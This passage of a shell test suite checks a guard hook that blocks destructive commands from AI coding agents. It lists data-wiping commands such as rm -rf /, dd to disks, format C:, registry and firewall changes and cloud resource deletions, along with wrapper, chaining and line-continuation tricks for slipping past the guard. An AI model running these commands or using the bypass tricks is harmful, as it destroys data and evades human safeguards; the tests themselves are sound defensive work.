expect_deny 'aws apigateway delete-model --rest-api-id abc --model-name MyModel' \
                                                       'apigateway delete-model'
expect_deny 'aws apigateway delete-domain-name --domain-name api.example.com' \
                                                       'apigateway delete-domain-name'
expect_deny 'aws apigateway delete-usage-plan --usage-plan-id abc' \
                                                       'apigateway delete-usage-plan'
expect_deny 'aws apigatewayv2 delete-api --api-id abc123' \
                                                       'apigatewayv2 delete-api'
expect_deny 'aws apigatewayv2 delete-route --api-id abc --route-id xyz' \
                                                       'apigatewayv2 delete-route'
expect_deny 'aws apigatewayv2 delete-integration --api-id abc --integration-id xyz' \
                                                       'apigatewayv2 delete-integration'
expect_deny 'aws apigatewayv2 delete-stage --api-id abc --stage-name prod' \
                                                       'apigatewayv2 delete-stage'
expect_deny 'aws apigatewayv2 delete-authorizer --api-id abc --authorizer-id xyz' \
                                                       'apigatewayv2 delete-authorizer'
expect_deny 'aws apigatewayv2 delete-domain-name --domain-name api.example.com' \
                                                       'apigatewayv2 delete-domain-name'

# =============================================================================
section "API Gateway: Kong"
# =============================================================================
expect_deny 'deck reset'                               'deck reset'
expect_deny 'deck gateway reset'                       'deck gateway reset'
expect_deny 'curl -X DELETE http://localhost:8001/services/myservice' \
                                                       'kong admin delete services'
expect_deny 'curl -X DELETE http://localhost:8001/routes/myroute' \
                                                       'kong admin delete routes'
expect_deny 'curl -X DELETE http://localhost:8001/plugins/myplugin' \
                                                       'kong admin delete plugins'
expect_deny 'curl -X DELETE http://localhost:8001/consumers/myconsumer' \
                                                       'kong admin delete consumers'
expect_deny 'curl -X DELETE http://localhost:8001/upstreams/myupstream' \
                                                       'kong admin delete upstreams'

# =============================================================================
section "API Gateway: Apigee"
# =============================================================================
expect_deny 'gcloud apigee apis delete my-api --organization=myorg' \
                                                       'apigee apis delete'
expect_deny 'gcloud apigee environments delete staging --organization=myorg' \
                                                       'apigee environments delete'
expect_deny 'gcloud apigee developers delete dev@example.com --organization=myorg' \
                                                       'apigee developers delete'
expect_deny 'gcloud apigee products delete my-product --organization=myorg' \
                                                       'apigee products delete'
expect_deny 'gcloud apigee organizations delete myorg' 'apigee organizations delete'
expect_deny 'apigeecli apis delete --name my-api --org myorg' \
                                                       'apigeecli apis delete'

# =============================================================================
section "Load Balancer: ELB"
# =============================================================================
expect_deny 'aws elbv2 delete-load-balancer --load-balancer-arn arn:xxx' \
                                                       'elbv2 delete-load-balancer'
expect_deny 'aws elbv2 delete-target-group --target-group-arn arn:xxx' \
                                                       'elbv2 delete-target-group'
expect_deny 'aws elbv2 deregister-targets --target-group-arn arn:xxx --targets Id=i-123' \
                                                       'elbv2 deregister-targets'
expect_deny 'aws elbv2 delete-listener --listener-arn arn:xxx' \
                                                       'elbv2 delete-listener'
expect_deny 'aws elbv2 delete-rule --rule-arn arn:xxx' 'elbv2 delete-rule'
expect_deny 'aws elb delete-load-balancer --load-balancer-name myclb' \
                                                       'elb delete-load-balancer (classic)'
expect_deny 'aws elb deregister-instances-from-load-balancer --load-balancer-name myclb --instances i-123' \
                                                       'elb deregister-instances'

# =============================================================================
section "Load Balancer: HAProxy"
# =============================================================================
expect_deny 'haproxy -sf 1234'                         'haproxy soft stop'
expect_deny 'haproxy -st 1234'                         'haproxy hard stop'
expect_deny 'systemctl stop haproxy'                   'systemctl stop haproxy'
expect_deny 'service haproxy stop'                     'service haproxy stop'

# =============================================================================
section "Load Balancer: nginx"
# =============================================================================
expect_deny 'nginx -s stop'                            'nginx stop'
expect_deny 'nginx -s quit'                            'nginx quit'
expect_deny 'systemctl stop nginx'                     'systemctl stop nginx'
expect_deny 'service nginx stop'                       'service nginx stop'

# =============================================================================
section "Load Balancer: Traefik"
# =============================================================================
expect_deny 'docker stop traefik'                      'docker stop traefik'
expect_deny 'docker rm traefik'                        'docker rm traefik'
expect_deny 'docker-compose down traefik'              'docker-compose down traefik'
expect_deny 'kubectl delete pod traefik'               'kubectl delete traefik pod'
expect_deny 'kubectl delete ingressroute myroute'      'kubectl delete ingressroute'
expect_deny 'systemctl stop traefik'                   'systemctl stop traefik'
expect_deny 'service traefik stop'                     'service traefik stop'

# =============================================================================
section "Email: SendGrid"
# =============================================================================
expect_deny 'curl -X DELETE https://api.sendgrid.com/v3/templates/abc' \
                                                       'sendgrid delete template'
expect_deny 'curl -X DELETE https://api.sendgrid.com/v3/api_keys/abc' \
                                                       'sendgrid delete api key'

# =============================================================================
section "Email: Mailgun"
# =============================================================================
expect_deny 'curl -X DELETE https://api.mailgun.net/v3/domains/example.com' \
                                                       'mailgun delete domain'
expect_deny 'curl -X DELETE https://api.mailgun.net/v3/routes/abc' \
                                                       'mailgun delete route'

# =============================================================================
section "Email: Postmark"
# =============================================================================
expect_deny 'curl -X DELETE https://api.postmarkapp.com/servers/123' \
                                                       'postmark delete server'
expect_deny 'curl -X DELETE https://api.postmarkapp.com/templates/123' \
                                                       'postmark delete template'

# =============================================================================
section "AI Tools"
# =============================================================================
expect_deny 'huggingface-cli delete-cache'             'hf delete-cache'
expect_deny 'wandb sweep stop abc123'                  'wandb sweep stop'
expect_deny 'wandb artifact rm entity/project/artifact' \
                                                       'wandb artifact rm'

# =============================================================================
section "Strict Git (extra protections)"
# =============================================================================
expect_deny 'git push --force origin main'             'push force to main'
expect_deny 'git rebase main'                          'git rebase'
expect_deny 'git commit --amend'                       'git commit --amend'
expect_deny 'git cherry-pick abc123'                   'git cherry-pick'
expect_deny 'git filter-branch --tree-filter cmd HEAD'  'git filter-branch'
expect_deny 'git filter-repo --path src/'               'git filter-repo'
expect_deny 'git reflog expire --expire=now --all'      'git reflog expire'
expect_deny 'git gc --aggressive'                       'git gc --aggressive'
expect_deny 'git worktree remove /path/to/worktree'    'git worktree remove'
expect_deny 'git submodule deinit mymodule'             'git submodule deinit'
expect_deny 'git push origin master'                    'git push to master'

# =============================================================================
section "Windows (cross-platform detection)"
# =============================================================================
expect_deny 'del /s /q C:\Windows\System32'            'del /s /q system32'
expect_deny 'del /s C:\Users'                          'del /s recursive'
expect_deny 'rmdir /s /q C:\Windows\System32'          'rmdir /s /q system'
expect_deny 'rmdir /s C:\Users'                        'rmdir /s recursive'
expect_deny 'Remove-Item -Recurse -Force C:\Windows'   'Remove-Item system'
expect_deny 'Remove-Item -Recurse -Force C:\Windows\System32' \
                                                       'Remove-Item system32'
expect_deny 'sc stop W32Time'                          'sc stop critical service'
expect_deny 'sc delete MyService'                      'sc delete service'
expect_deny 'Stop-Service W32Time'                     'Stop-Service critical'
expect_deny 'taskkill /F /IM svchost.exe'              'taskkill force system'
expect_deny 'diskpart'                                 'diskpart'
expect_deny 'format C:'                                'format drive'
expect_deny 'Clear-Disk -Number 0'                     'Clear-Disk'
expect_deny 'Initialize-Disk -Number 0'                'Initialize-Disk'
expect_deny 'Remove-Partition -DiskNumber 0'           'Remove-Partition'
expect_deny 'Set-ExecutionPolicy Bypass'               'Set-ExecutionPolicy Bypass'
expect_deny 'reg delete HKLM\SYSTEM /f'                'reg delete system hive'
expect_deny 'reg delete HKLM\SOFTWARE /f'              'reg delete force'
expect_deny 'reg import malicious.reg'                 'reg import'
expect_deny 'netsh advfirewall set allprofiles state off' \
                                                       'netsh firewall disable'
expect_deny 'netsh advfirewall reset'                  'netsh firewall reset'
expect_deny 'Set-NetFirewallProfile -Enabled False'    'Set-NetFirewall disable'
expect_deny 'Disable-NetAdapter -Name Ethernet'        'Disable-NetAdapter'
expect_deny 'icacls C:\Windows /grant Everyone:F /T'   'icacls grant everyone system'
expect_deny 'icacls C:\Users /grant Everyone:F'        'icacls grant everyone'
expect_deny 'icacls C:\Windows /reset /T'              'icacls reset recursive'
expect_deny 'takeown /F C:\Windows /R'                 'takeown recursive'

# =============================================================================
section "macOS System"
# =============================================================================
expect_deny 'tmutil delete /backup/2024-01-01'         'tmutil delete'
expect_deny 'diskutil eraseDisk JHFS+ Clean disk0'     'diskutil erase'

# =============================================================================
section "Bypass Vectors: Wrappers"
# =============================================================================
# sudo wrapper
expect_deny 'sudo rm -rf /'                           'sudo rm -rf /'
expect_deny 'sudo git reset --hard'                    'sudo git reset --hard'
expect_deny 'sudo dd if=/dev/zero of=/dev/sda'         'sudo dd to device'
expect_deny 'sudo terraform destroy'                   'sudo terraform destroy'

# env wrapper
expect_deny 'env rm -rf /'                             'env rm -rf /'
expect_deny 'env git reset --hard'                     'env git reset --hard'

# absolute path
expect_deny '/usr/bin/git reset --hard'                '/usr/bin/git reset --hard'
expect_deny '/bin/rm -rf /'                            '/bin/rm -rf /'

# .exe suffix
expect_deny 'git.exe reset --hard'                     'git.exe reset --hard'

# quoted binary
expect_deny '"git" reset --hard'                       '"git" reset --hard'

# line continuation
expect_deny "$(printf 'git re\\\nset --hard')"         'line continuation bypass'

# path traversal in safe paths
expect_deny 'rm -rf /tmp/../etc'                       'path traversal /tmp/../etc'

# =============================================================================
section "Bypass Vectors: Chaining & Subshells"
# =============================================================================
expect_deny 'echo hello && rm -rf /'                   'chained && destructive'
expect_deny 'ls; rm -rf /'                             'chained ; destructive'
expect_deny 'true || rm -rf /'                         'chained || destructive'
expect_deny 'bash -c "rm -rf /"'                       'bash -c destructive'
expect_deny 'sh -c "rm -rf /"'                         'sh -c destructive'

# =============================================================================
section "Context-Aware False Positive Reduction"
# =============================================================================
# Destructive strings in data contexts should be ALLOWED
expect_allow 'echo "DROP TABLE users"'                 'echo data context'
expect_allow 'echo "rm -rf /"'                         'echo rm -rf in quotes'
expect_allow 'git commit -m "rm -rf /"'                'commit message context'
expect_allow 'git commit -m "DROP DATABASE test"'      'commit message with SQL'
expect_allow 'grep "git reset --hard" file.txt'        'grep search pattern'
expect_allow 'grep "rm -rf" changelog.md'              'grep rm -rf in file'
expect_allow 'ls # rm -rf /'                           'comment after command'
expect_allow 'cat README.md # DROP TABLE'              'comment with SQL'

# =============================================================================
section "Hook Protocol Tests"
# =============================================================================
# Claude protocol
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"git reset --hard"}}' \
  'Claude protocol: git reset --hard'
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"rm -rf /"}}' \
  'Claude protocol: rm -rf /'
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"terraform destroy"}}' \
  'Claude protocol: terraform destroy'
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"DROP DATABASE production"}}' \
  'Claude protocol: DROP DATABASE'
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"kubectl delete namespace prod"}}' \
  'Claude protocol: kubectl delete namespace'
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"aws ec2 terminate-instances --instance-ids i-123"}}' \
  'Claude protocol: aws ec2 terminate'
expect_hook_deny \
  '{"toolName":"Bash","toolInput":{"command":"docker system prune -af"}}' \
  'Claude protocol: docker system prune'

expect_hook_allow \
  '{"toolName":"Bash","toolInput":{"command":"git status"}}' \
  'Claude protocol: git status (safe)'
expect_hook_allow \
  '{"toolName":"Bash","toolInput":{"command":"ls -la"}}' \
  'Claude protocol: ls -la (safe)'
expect_hook_allow \
  '{"toolName":"Bash","toolInput":{"command":"terraform plan"}}' \
  'Claude protocol: terraform plan (safe)'
expect_hook_allow \
  '{"toolName":"Read","toolInput":{"path":"file.txt"}}' \
  'Claude protocol: non-Bash tool (pass through)'

# Copilot protocol
expect_hook_deny \
  '{"toolName":"launch-process","toolArgs":{"command":"rm -rf /"}}' \
  'Copilot protocol: rm -rf /'
expect_hook_deny \
  '{"toolName":"launch-process","toolArgs":{"command":"kubectl delete namespace prod"}}' \
  'Copilot protocol: kubectl delete namespace'
expect_hook_deny \
  '{"toolName":"launch-process","toolArgs":{"command":"terraform destroy"}}' \
  'Copilot protocol: terraform destroy'
expect_hook_allow \
  '{"toolName":"launch-process","toolArgs":{"command":"ls -la"}}' \
  'Copilot protocol: ls -la (safe)'
expect_hook_allow \
  '{"toolName":"launch-process","toolArgs":{"command":"git status"}}' \
  'Copilot protocol: git status (safe)'

# Edge cases
expect_hook_allow \
  '{"toolName":"Bash","toolInput":{"command":""}}' \
  'Hook: empty command'

# =============================================================================
# Summary
# =============================================================================
echo ""
echo "==========================================="
echo "  Results: $PASS/$TOTAL passed, $FAIL failed"
echo "==========================================="

if [ "$FAIL" -gt 0 ]; then
  echo ""
  echo "--- FAILURE REPORT (regression guide) ---"
  echo ""
  printf "%-12s %-30s %-12s %s\n" "TYPE" "CATEGORY" "EXIT CODES" "LABEL"
  printf "%-12s %-30s %-12s %s\n" "----" "--------" "----------" "-----"
  while IFS='|' read -r type category label exitinfo cmd; do
    type="${type#"${type%%[![:space:]]*}"}"
    type="${type%"${type##*[![:space:]]}"}"
    category="${category#"${category%%[![:space:]]*}"}"
    category="${category%"${category##*[![:space:]]}"}"
    label="${label#"${label%%[![:space:]]*}"}"
    label="${label%"${label##*[![:space:]]}"}"
    exitinfo="${exitinfo#"${exitinfo%%[![:space:]]*}"}"
    exitinfo="${exitinfo%"${exitinfo##*[![:space:]]}"}"
    printf "%-12s %-30s %-12s %s\n" "$type" "$category" "$exitinfo" "$label"
  done < "$FAILURE_REPORT"
  echo ""
  echo "Full failure details: $FAILURE_REPORT"
  echo ""
  echo "Each line in the report follows the format:"
  echo "  TYPE | CATEGORY | LABEL | expected=N got=N | COMMAND"
  echo ""
  echo "FAILED: $FAIL test(s) did not pass."
  exit 1
fi

echo "All destructive command tests passed!"
exit 0
